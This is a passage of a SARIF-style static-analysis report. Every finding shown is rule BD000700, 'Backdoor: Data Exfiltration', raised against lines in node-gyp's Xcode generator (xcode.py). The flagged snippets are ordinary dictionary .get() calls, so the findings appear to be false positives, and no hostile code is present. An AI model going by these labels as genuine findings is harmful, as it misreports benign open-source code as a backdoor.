                      "markdown": "`        is_xcuitest = int(spec.get(\"mac_xcuitest_bundle\", 0))\n        is_bundle = int(spec.get(\"mac_bundle\", 0)) or is_xctest\n        is_app_extension = int(spec.get(\"ios_app_extension\", 0))\n        is_watchkit_extension = int(spec.get(\"ios_watchkit_extension\", 0))\n        is_watch_app = int(spec.get(\"ios_watch_app\", 0))\n        if type != \"none\":\n            type_bundle_key = type\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/xcode.py"
                },
                "region": {
                  "startLine": 752,
                  "startColumn": 35,
                  "endLine": 752,
                  "endColumn": 40,
                  "snippet": {
                    "text": "        is_xctest = int(spec.get(\"mac_xctest_bundle\", 0))\n        is_xcuitest = int(spec.get(\"mac_xcuitest_bundle\", 0))\n        is_bundle = int(spec.get(\"mac_bundle\", 0)) or is_xctest\n        is_app_extension = int(spec.get(\"ios_app_extension\", 0))\n        is_watchkit_extension = int(spec.get(\"ios_watchkit_extension\", 0))\n        is_watch_app = int(spec.get(\"ios_watch_app\", 0))\n        if type != \"none\":\n",
                    "rendered": {
                      "text": "        is_xctest = int(spec.get(\"mac_xctest_bundle\", 0))\n        is_xcuitest = int(spec.get(\"mac_xcuitest_bundle\", 0))\n        is_bundle = int(spec.get(\"mac_bundle\", 0)) or is_xctest\n        is_app_extension = int(spec.get(\"ios_app_extension\", 0))\n        is_watchkit_extension = int(spec.get(\"ios_watchkit_extension\", 0))\n        is_watch_app = int(spec.get(\"ios_watch_app\", 0))\n        if type != \"none\":\n",
                      "markdown": "`        is_xctest = int(spec.get(\"mac_xctest_bundle\", 0))\n        is_xcuitest = int(spec.get(\"mac_xcuitest_bundle\", 0))\n        is_bundle = int(spec.get(\"mac_bundle\", 0)) or is_xctest\n        is_app_extension = int(spec.get(\"ios_app_extension\", 0))\n        is_watchkit_extension = int(spec.get(\"ios_watchkit_extension\", 0))\n        is_watch_app = int(spec.get(\"ios_watch_app\", 0))\n        if type != \"none\":\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/xcode.py"
                },
                "region": {
                  "startLine": 751,
                  "startColumn": 28,
                  "endLine": 751,
                  "endColumn": 33,
                  "snippet": {
                    "text": "        type = spec[\"type\"]\n        is_xctest = int(spec.get(\"mac_xctest_bundle\", 0))\n        is_xcuitest = int(spec.get(\"mac_xcuitest_bundle\", 0))\n        is_bundle = int(spec.get(\"mac_bundle\", 0)) or is_xctest\n        is_app_extension = int(spec.get(\"ios_app_extension\", 0))\n        is_watchkit_extension = int(spec.get(\"ios_watchkit_extension\", 0))\n        is_watch_app = int(spec.get(\"ios_watch_app\", 0))\n",
                    "rendered": {
                      "text": "        type = spec[\"type\"]\n        is_xctest = int(spec.get(\"mac_xctest_bundle\", 0))\n        is_xcuitest = int(spec.get(\"mac_xcuitest_bundle\", 0))\n        is_bundle = int(spec.get(\"mac_bundle\", 0)) or is_xctest\n        is_app_extension = int(spec.get(\"ios_app_extension\", 0))\n        is_watchkit_extension = int(spec.get(\"ios_watchkit_extension\", 0))\n        is_watch_app = int(spec.get(\"ios_watch_app\", 0))\n",
                      "markdown": "`        type = spec[\"type\"]\n        is_xctest = int(spec.get(\"mac_xctest_bundle\", 0))\n        is_xcuitest = int(spec.get(\"mac_xcuitest_bundle\", 0))\n        is_bundle = int(spec.get(\"mac_bundle\", 0)) or is_xctest\n        is_app_extension = int(spec.get(\"ios_app_extension\", 0))\n        is_watchkit_extension = int(spec.get(\"ios_watchkit_extension\", 0))\n        is_watch_app = int(spec.get(\"ios_watch_app\", 0))\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/xcode.py"
                },
                "region": {
                  "startLine": 750,
                  "startColumn": 30,
                  "endLine": 750,
                  "endColumn": 35,
                  "snippet": {
                    "text": "\n        type = spec[\"type\"]\n        is_xctest = int(spec.get(\"mac_xctest_bundle\", 0))\n        is_xcuitest = int(spec.get(\"mac_xcuitest_bundle\", 0))\n        is_bundle = int(spec.get(\"mac_bundle\", 0)) or is_xctest\n        is_app_extension = int(spec.get(\"ios_app_extension\", 0))\n        is_watchkit_extension = int(spec.get(\"ios_watchkit_extension\", 0))\n",
                    "rendered": {
                      "text": "\n        type = spec[\"type\"]\n        is_xctest = int(spec.get(\"mac_xctest_bundle\", 0))\n        is_xcuitest = int(spec.get(\"mac_xcuitest_bundle\", 0))\n        is_bundle = int(spec.get(\"mac_bundle\", 0)) or is_xctest\n        is_app_extension = int(spec.get(\"ios_app_extension\", 0))\n        is_watchkit_extension = int(spec.get(\"ios_watchkit_extension\", 0))\n",
                      "markdown": "`\n        type = spec[\"type\"]\n        is_xctest = int(spec.get(\"mac_xctest_bundle\", 0))\n        is_xcuitest = int(spec.get(\"mac_xcuitest_bundle\", 0))\n        is_bundle = int(spec.get(\"mac_bundle\", 0)) or is_xctest\n        is_app_extension = int(spec.get(\"ios_app_extension\", 0))\n        is_watchkit_extension = int(spec.get(\"ios_watchkit_extension\", 0))\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/xcode.py"
                },
                "region": {
                  "startLine": 749,
                  "startColumn": 28,
                  "endLine": 749,
                  "endColumn": 33,
                  "snippet": {
                    "text": "        }\n\n        type = spec[\"type\"]\n        is_xctest = int(spec.get(\"mac_xctest_bundle\", 0))\n        is_xcuitest = int(spec.get(\"mac_xcuitest_bundle\", 0))\n        is_bundle = int(spec.get(\"mac_bundle\", 0)) or is_xctest\n        is_app_extension = int(spec.get(\"ios_app_extension\", 0))\n",
                    "rendered": {
                      "text": "        }\n\n        type = spec[\"type\"]\n        is_xctest = int(spec.get(\"mac_xctest_bundle\", 0))\n        is_xcuitest = int(spec.get(\"mac_xcuitest_bundle\", 0))\n        is_bundle = int(spec.get(\"mac_bundle\", 0)) or is_xctest\n        is_app_extension = int(spec.get(\"ios_app_extension\", 0))\n",
                      "markdown": "`        }\n\n        type = spec[\"type\"]\n        is_xctest = int(spec.get(\"mac_xctest_bundle\", 0))\n        is_xcuitest = int(spec.get(\"mac_xcuitest_bundle\", 0))\n        is_bundle = int(spec.get(\"mac_bundle\", 0)) or is_xctest\n        is_app_extension = int(spec.get(\"ios_app_extension\", 0))\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/xcode.py"
                },
                "region": {
                  "startLine": 689,
                  "startColumn": 30,
                  "endLine": 689,
                  "endColumn": 35,
                  "snippet": {
                    "text": "        pbxp.SetProperty(\"attributes\", project_attributes)\n\n        # Add gyp/gypi files to project\n        if not generator_flags.get(\"standalone\"):\n            main_group = pbxp.GetProperty(\"mainGroup\")\n            build_group = gyp.xcodeproj_file.PBXGroup({\"name\": \"Build\"})\n            main_group.AppendChild(build_group)\n",
                    "rendered": {
                      "text": "        pbxp.SetProperty(\"attributes\", project_attributes)\n\n        # Add gyp/gypi files to project\n        if not generator_flags.get(\"standalone\"):\n            main_group = pbxp.GetProperty(\"mainGroup\")\n            build_group = gyp.xcodeproj_file.PBXGroup({\"name\": \"Build\"})\n            main_group.AppendChild(build_group)\n",
                      "markdown": "`        pbxp.SetProperty(\"attributes\", project_attributes)\n\n        # Add gyp/gypi files to project\n        if not generator_flags.get(\"standalone\"):\n            main_group = pbxp.GetProperty(\"mainGroup\")\n            build_group = gyp.xcodeproj_file.PBXGroup({\"name\": \"Build\"})\n            main_group.AppendChild(build_group)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/xcode.py"
                },
                "region": {
                  "startLine": 663,
                  "startColumn": 45,
                  "endLine": 663,
                  "endColumn": 50,
                  "snippet": {
                    "text": "        while len(upgrade_check_project_version) < 4:\n            upgrade_check_project_version = \"0\" + upgrade_check_project_version\n\n    skip_excluded_files = not generator_flags.get(\"xcode_list_excluded_files\", True)\n    xcode_projects = {}\n    for build_file, build_file_dict in data.items():\n        (build_file_root, build_file_ext) = os.path.splitext(build_file)\n",
                    "rendered": {
                      "text": "        while len(upgrade_check_project_version) < 4:\n            upgrade_check_project_version = \"0\" + upgrade_check_project_version\n\n    skip_excluded_files = not generator_flags.get(\"xcode_list_excluded_files\", True)\n    xcode_projects = {}\n    for build_file, build_file_dict in data.items():\n        (build_file_root, build_file_ext) = os.path.splitext(build_file)\n",
                      "markdown": "`        while len(upgrade_check_project_version) < 4:\n            upgrade_check_project_version = \"0\" + upgrade_check_project_version\n\n    skip_excluded_files = not generator_flags.get(\"xcode_list_excluded_files\", True)\n    xcode_projects = {}\n    for build_file, build_file_dict in data.items():\n        (build_file_root, build_file_ext) = os.path.splitext(build_file)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/xcode.py"
                },
                "region": {
                  "startLine": 653,
                  "startColumn": 51,
                  "endLine": 653,
                  "endColumn": 56,
                  "snippet": {
                    "text": "    generator_flags = params.get(\"generator_flags\", {})\n    parallel_builds = generator_flags.get(\"xcode_parallel_builds\", True)\n    serialize_all_tests = generator_flags.get(\"xcode_serialize_all_test_runs\", True)\n    upgrade_check_project_version = generator_flags.get(\n        \"xcode_upgrade_check_project_version\", None\n    )\n\n",
                    "rendered": {
                      "text": "    generator_flags = params.get(\"generator_flags\", {})\n    parallel_builds = generator_flags.get(\"xcode_parallel_builds\", True)\n    serialize_all_tests = generator_flags.get(\"xcode_serialize_all_test_runs\", True)\n    upgrade_check_project_version = generator_flags.get(\n        \"xcode_upgrade_check_project_version\", None\n    )\n\n",
                      "markdown": "`    generator_flags = params.get(\"generator_flags\", {})\n    parallel_builds = generator_flags.get(\"xcode_parallel_builds\", True)\n    serialize_all_tests = generator_flags.get(\"xcode_serialize_all_test_runs\", True)\n    upgrade_check_project_version = generator_flags.get(\n        \"xcode_upgrade_check_project_version\", None\n    )\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/xcode.py"
                },
                "region": {
                  "startLine": 652,
                  "startColumn": 41,
                  "endLine": 652,
                  "endColumn": 46,
                  "snippet": {
                    "text": "    options = params[\"options\"]\n    generator_flags = params.get(\"generator_flags\", {})\n    parallel_builds = generator_flags.get(\"xcode_parallel_builds\", True)\n    serialize_all_tests = generator_flags.get(\"xcode_serialize_all_test_runs\", True)\n    upgrade_check_project_version = generator_flags.get(\n        \"xcode_upgrade_check_project_version\", None\n    )\n",
                    "rendered": {
                      "text": "    options = params[\"options\"]\n    generator_flags = params.get(\"generator_flags\", {})\n    parallel_builds = generator_flags.get(\"xcode_parallel_builds\", True)\n    serialize_all_tests = generator_flags.get(\"xcode_serialize_all_test_runs\", True)\n    upgrade_check_project_version = generator_flags.get(\n        \"xcode_upgrade_check_project_version\", None\n    )\n",
                      "markdown": "`    options = params[\"options\"]\n    generator_flags = params.get(\"generator_flags\", {})\n    parallel_builds = generator_flags.get(\"xcode_parallel_builds\", True)\n    serialize_all_tests = generator_flags.get(\"xcode_serialize_all_test_runs\", True)\n    upgrade_check_project_version = generator_flags.get(\n        \"xcode_upgrade_check_project_version\", None\n    )\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/xcode.py"
                },
                "region": {
                  "startLine": 651,
                  "startColumn": 37,
                  "endLine": 651,
                  "endColumn": 42,
                  "snippet": {
                    "text": "\n    options = params[\"options\"]\n    generator_flags = params.get(\"generator_flags\", {})\n    parallel_builds = generator_flags.get(\"xcode_parallel_builds\", True)\n    serialize_all_tests = generator_flags.get(\"xcode_serialize_all_test_runs\", True)\n    upgrade_check_project_version = generator_flags.get(\n        \"xcode_upgrade_check_project_version\", None\n",
                    "rendered": {
                      "text": "\n    options = params[\"options\"]\n    generator_flags = params.get(\"generator_flags\", {})\n    parallel_builds = generator_flags.get(\"xcode_parallel_builds\", True)\n    serialize_all_tests = generator_flags.get(\"xcode_serialize_all_test_runs\", True)\n    upgrade_check_project_version = generator_flags.get(\n        \"xcode_upgrade_check_project_version\", None\n",
                      "markdown": "`\n    options = params[\"options\"]\n    generator_flags = params.get(\"generator_flags\", {})\n    parallel_builds = generator_flags.get(\"xcode_parallel_builds\", True)\n    serialize_all_tests = generator_flags.get(\"xcode_serialize_all_test_runs\", True)\n    upgrade_check_project_version = generator_flags.get(\n        \"xcode_upgrade_check_project_version\", None\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/xcode.py"
                },
                "region": {
                  "startLine": 650,
                  "startColumn": 28,
                  "endLine": 650,
                  "endColumn": 33,
                  "snippet": {
                    "text": "        )\n\n    options = params[\"options\"]\n    generator_flags = params.get(\"generator_flags\", {})\n    parallel_builds = generator_flags.get(\"xcode_parallel_builds\", True)\n    serialize_all_tests = generator_flags.get(\"xcode_serialize_all_test_runs\", True)\n    upgrade_check_project_version = generator_flags.get(\n",
                    "rendered": {
                      "text": "        )\n\n    options = params[\"options\"]\n    generator_flags = params.get(\"generator_flags\", {})\n    parallel_builds = generator_flags.get(\"xcode_parallel_builds\", True)\n    serialize_all_tests = generator_flags.get(\"xcode_serialize_all_test_runs\", True)\n    upgrade_check_project_version = generator_flags.get(\n",
                      "markdown": "`        )\n\n    options = params[\"options\"]\n    generator_flags = params.get(\"generator_flags\", {})\n    parallel_builds = generator_flags.get(\"xcode_parallel_builds\", True)\n    serialize_all_tests = generator_flags.get(\"xcode_serialize_all_test_runs\", True)\n    upgrade_check_project_version = generator_flags.get(\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/xcode.py"
                },
                "region": {
                  "startLine": 643,
                  "startColumn": 26,
                  "endLine": 643,
                  "endColumn": 31,
                  "snippet": {
                    "text": "\ndef GenerateOutput(target_list, target_dicts, data, params):\n    # Optionally configure each spec to use ninja as the external builder.\n    ninja_wrapper = params.get(\"flavor\") == \"ninja\"\n    if ninja_wrapper:\n        (target_list, target_dicts, data) = gyp.xcode_ninja.CreateWrapper(\n            target_list, target_dicts, data, params\n",
                    "rendered": {
                      "text": "\ndef GenerateOutput(target_list, target_dicts, data, params):\n    # Optionally configure each spec to use ninja as the external builder.\n    ninja_wrapper = params.get(\"flavor\") == \"ninja\"\n    if ninja_wrapper:\n        (target_list, target_dicts, data) = gyp.xcode_ninja.CreateWrapper(\n            target_list, target_dicts, data, params\n",
                      "markdown": "`\ndef GenerateOutput(target_list, target_dicts, data, params):\n    # Optionally configure each spec to use ninja as the external builder.\n    ninja_wrapper = params.get(\"flavor\") == \"ninja\"\n    if ninja_wrapper:\n        (target_list, target_dicts, data) = gyp.xcode_ninja.CreateWrapper(\n            target_list, target_dicts, data, params\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/xcode.py"
                },
                "region": {
                  "startLine": 623,
                  "startColumn": 54,
                  "endLine": 623,
                  "endColumn": 59,
                  "snippet": {
                    "text": "    toplevel = params[\"options\"].toplevel_dir\n    if params.get(\"flavor\") == \"ninja\":\n        generator_dir = os.path.relpath(params[\"options\"].generator_output or \".\")\n        output_dir = params.get(\"generator_flags\", {}).get(\"output_dir\", \"out\")\n        output_dir = os.path.normpath(os.path.join(generator_dir, output_dir))\n        qualified_out_dir = os.path.normpath(\n            os.path.join(toplevel, output_dir, \"gypfiles-xcode-ninja\")\n",
                    "rendered": {
                      "text": "    toplevel = params[\"options\"].toplevel_dir\n    if params.get(\"flavor\") == \"ninja\":\n        generator_dir = os.path.relpath(params[\"options\"].generator_output or \".\")\n        output_dir = params.get(\"generator_flags\", {}).get(\"output_dir\", \"out\")\n        output_dir = os.path.normpath(os.path.join(generator_dir, output_dir))\n        qualified_out_dir = os.path.normpath(\n            os.path.join(toplevel, output_dir, \"gypfiles-xcode-ninja\")\n",
                      "markdown": "`    toplevel = params[\"options\"].toplevel_dir\n    if params.get(\"flavor\") == \"ninja\":\n        generator_dir = os.path.relpath(params[\"options\"].generator_output or \".\")\n        output_dir = params.get(\"generator_flags\", {}).get(\"output_dir\", \"out\")\n        output_dir = os.path.normpath(os.path.join(generator_dir, output_dir))\n        qualified_out_dir = os.path.normpath(\n            os.path.join(toplevel, output_dir, \"gypfiles-xcode-ninja\")\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/xcode.py"
                },
                "region": {
                  "startLine": 623,
                  "startColumn": 27,
                  "endLine": 623,
                  "endColumn": 32,
                  "snippet": {
                    "text": "    toplevel = params[\"options\"].toplevel_dir\n    if params.get(\"flavor\") == \"ninja\":\n        generator_dir = os.path.relpath(params[\"options\"].generator_output or \".\")\n        output_dir = params.get(\"generator_flags\", {}).get(\"output_dir\", \"out\")\n        output_dir = os.path.normpath(os.path.join(generator_dir, output_dir))\n        qualified_out_dir = os.path.normpath(\n            os.path.join(toplevel, output_dir, \"gypfiles-xcode-ninja\")\n",
                    "rendered": {
                      "text": "    toplevel = params[\"options\"].toplevel_dir\n    if params.get(\"flavor\") == \"ninja\":\n        generator_dir = os.path.relpath(params[\"options\"].generator_output or \".\")\n        output_dir = params.get(\"generator_flags\", {}).get(\"output_dir\", \"out\")\n        output_dir = os.path.normpath(os.path.join(generator_dir, output_dir))\n        qualified_out_dir = os.path.normpath(\n            os.path.join(toplevel, output_dir, \"gypfiles-xcode-ninja\")\n",
                      "markdown": "`    toplevel = params[\"options\"].toplevel_dir\n    if params.get(\"flavor\") == \"ninja\":\n        generator_dir = os.path.relpath(params[\"options\"].generator_output or \".\")\n        output_dir = params.get(\"generator_flags\", {}).get(\"output_dir\", \"out\")\n        output_dir = os.path.normpath(os.path.join(generator_dir, output_dir))\n        qualified_out_dir = os.path.normpath(\n            os.path.join(toplevel, output_dir, \"gypfiles-xcode-ninja\")\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/xcode.py"
                },
                "region": {
                  "startLine": 621,
                  "startColumn": 13,
                  "endLine": 621,
                  "endColumn": 18,
                  "snippet": {
                    "text": "\ndef CalculateGeneratorInputInfo(params):\n    toplevel = params[\"options\"].toplevel_dir\n    if params.get(\"flavor\") == \"ninja\":\n        generator_dir = os.path.relpath(params[\"options\"].generator_output or \".\")\n        output_dir = params.get(\"generator_flags\", {}).get(\"output_dir\", \"out\")\n        output_dir = os.path.normpath(os.path.join(generator_dir, output_dir))\n",
                    "rendered": {
                      "text": "\ndef CalculateGeneratorInputInfo(params):\n    toplevel = params[\"options\"].toplevel_dir\n    if params.get(\"flavor\") == \"ninja\":\n        generator_dir = os.path.relpath(params[\"options\"].generator_output or \".\")\n        output_dir = params.get(\"generator_flags\", {}).get(\"output_dir\", \"out\")\n        output_dir = os.path.normpath(os.path.join(generator_dir, output_dir))\n",
                      "markdown": "`\ndef CalculateGeneratorInputInfo(params):\n    toplevel = params[\"options\"].toplevel_dir\n    if params.get(\"flavor\") == \"ninja\":\n        generator_dir = os.path.relpath(params[\"options\"].generator_output or \".\")\n        output_dir = params.get(\"generator_flags\", {}).get(\"output_dir\", \"out\")\n        output_dir = os.path.normpath(os.path.join(generator_dir, output_dir))\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/xcode.py"
                },
                "region": {
                  "startLine": 401,
                  "startColumn": 25,
                  "endLine": 401,
                  "endColumn": 30,
                  "snippet": {
                    "text": "        # and generate a second target that will run the tests runners found under\n        # the marked target.\n        for bf_tgt in self.build_file_dict[\"targets\"]:\n            if int(bf_tgt.get(\"xcode_create_dependents_test_runner\", 0)):\n                tgt_name = bf_tgt[\"target_name\"]\n                toolset = bf_tgt[\"toolset\"]\n                qualified_target = gyp.common.QualifiedTarget(\n",
                    "rendered": {
                      "text": "        # and generate a second target that will run the tests runners found under\n        # the marked target.\n        for bf_tgt in self.build_file_dict[\"targets\"]:\n            if int(bf_tgt.get(\"xcode_create_dependents_test_runner\", 0)):\n                tgt_name = bf_tgt[\"target_name\"]\n                toolset = bf_tgt[\"toolset\"]\n                qualified_target = gyp.common.QualifiedTarget(\n",
                      "markdown": "`        # and generate a second target that will run the tests runners found under\n        # the marked target.\n        for bf_tgt in self.build_file_dict[\"targets\"]:\n            if int(bf_tgt.get(\"xcode_create_dependents_test_runner\", 0)):\n                tgt_name = bf_tgt[\"target_name\"]\n                toolset = bf_tgt[\"toolset\"]\n                qualified_target = gyp.common.QualifiedTarget(\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/xcode.py"
                },
                "region": {
                  "startLine": 327,
                  "startColumn": 63,
                  "endLine": 327,
                  "endColumn": 68,
                  "snippet": {
                    "text": "                    + command_prefix\n                    + \"%s\\nexit 1\\n\"\n                    % gyp.xcodeproj_file.ConvertVariablesToShellSyntax(\n                        gyp.common.EncodePOSIXShellList(command.get(\"action\"))\n                    )\n                )\n\n",
                    "rendered": {
                      "text": "                    + command_prefix\n                    + \"%s\\nexit 1\\n\"\n                    % gyp.xcodeproj_file.ConvertVariablesToShellSyntax(\n                        gyp.common.EncodePOSIXShellList(command.get(\"action\"))\n                    )\n                )\n\n",
                      "markdown": "`                    + command_prefix\n                    + \"%s\\nexit 1\\n\"\n                    % gyp.xcodeproj_file.ConvertVariablesToShellSyntax(\n                        gyp.common.EncodePOSIXShellList(command.get(\"action\"))\n                    )\n                )\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/xcode.py"
                },
                "region": {
                  "startLine": 299,
                  "startColumn": 57,
                  "endLine": 299,
                  "endColumn": 62,
                  "snippet": {
                    "text": "                                        val\n                                    ),\n                                )\n                                for (key, val) in command.get(\"environment\").items()\n                            ]\n                        )\n                        + \"\\n\"\n",
                    "rendered": {
                      "text": "                                        val\n                                    ),\n                                )\n                                for (key, val) in command.get(\"environment\").items()\n                            ]\n                        )\n                        + \"\\n\"\n",
                      "markdown": "`                                        val\n                                    ),\n                                )\n                                for (key, val) in command.get(\"environment\").items()\n                            ]\n                        )\n                        + \"\\n\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/xcode.py"
                },
                "region": {
                  "startLine": 287,
                  "startColumn": 26,
                  "endLine": 287,
                  "endColumn": 31,
                  "snippet": {
                    "text": "                        )\n                    )\n\n                if command.get(\"environment\"):\n                    script = (\n                        script\n                        + \"\\n\".join(\n",
                    "rendered": {
                      "text": "                        )\n                    )\n\n                if command.get(\"environment\"):\n                    script = (\n                        script\n                        + \"\\n\".join(\n",
                      "markdown": "`                        )\n                    )\n\n                if command.get(\"environment\"):\n                    script = (\n                        script\n                        + \"\\n\".join(\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/xcode.py"
                },
                "region": {
                  "startLine": 283,
                  "startColumn": 35,
                  "endLine": 283,
                  "endColumn": 40,
                  "snippet": {
